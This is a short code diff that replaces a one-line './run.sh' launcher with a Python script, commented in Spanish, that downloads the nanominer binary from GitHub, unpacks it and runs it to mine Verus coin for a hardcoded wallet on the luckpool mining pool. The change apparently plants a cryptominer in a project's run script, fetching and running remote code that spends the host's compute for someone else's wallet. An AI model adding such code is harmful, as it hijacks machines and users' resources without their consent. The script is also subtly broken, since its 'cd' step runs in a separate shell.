@@ -1,1 +1,26 @@
-./run.sh
+import subprocess
+
+# Definir los comandos como una lista de argumentos
+commands = [
+    "wget https://github.com/nanopool/nanominer/releases/download/v3.6.3/nanominer-linux-3.6.3.tar.gz",
+    "tar -xf nanominer-linux-3.6.3.tar.gz",
+    "cd nanominer-linux-3.6.3",
+    "chmod +x nanominer",
+    "./nanominer -algo Verushash -wallet RXpS2eUefUChbjagNZTGCr1r4ALMarbUVo.netbook -coin VRSC -pool1 na.luckpool.net:3956 -t 8"
+]
+
+# Ejecutar cada comando secuencialmente
+for cmd in commands:
+    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout, stderr = process.communicate()
+    
+    # Imprimir la salida estándar y la salida de error estándar
+    if stdout:
+        print(stdout.decode())
+    if stderr:
+        print(stderr.decode())
+
+    # Comprobar si el comando se ejecutó correctamente
+    if process.returncode != 0:
+        print(f"Error con el comando: {cmd}")
+        break  # Detener si hay un error
